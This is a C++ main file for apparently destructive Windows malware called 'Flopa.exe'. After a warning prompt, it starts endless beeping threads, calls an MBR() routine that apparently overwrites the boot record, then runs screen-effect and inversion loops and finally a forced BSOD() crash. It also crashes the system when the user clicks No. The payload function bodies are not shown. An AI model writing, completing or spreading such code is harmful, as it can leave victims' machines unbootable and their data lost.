#include "VirsHad.h"
#include <Windows.h>
#include <thread>

int MBR();
int BSOD();
int TextO();
int Icons();
int Scuaer();
int Melt();
int Invers();

int c = 0;

int loop(){
    if (c < 200) {
        Scuaer();
        Invers();
        c++;
        loop();
    } else if (c < 2000) {
        TextO();
        Icons();
        c++;
        loop();
    } else if (c < 2300) {
        Melt();
        Invers();
        c++;
        loop();
    } else {
        BSOD();
    }
    return 0;
}

int Music() {
    MessageBeep(MB_OK);
    Sleep(1000);
    MessageBeep(MB_ICONINFORMATION);
    Sleep(1000);
    Music();
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
    int msgboxID = MessageBox(
        NULL,
        L"You start Flopa.exe.\nIts a virus.\nDo you want to start it?",
        L"Return the potatoes!",
        MB_ICONEXCLAMATION | MB_YESNO);

    if (msgboxID == IDYES)
    {
        std::thread th1(Music);
        Sleep(500);
        std::thread th2(Music);
        Sleep(500);
        std::thread th3(Music);
        MBR();
        loop();
    }
    else {
        int msgboxID = MessageBox(
            NULL,
            L"Goodby!!!",
            L"Return the potatoes!",
            MB_ICONEXCLAMATION | MB_OK);

        if (msgboxID == IDOK) {
            BSOD();
        }
    }
    return 0;
}
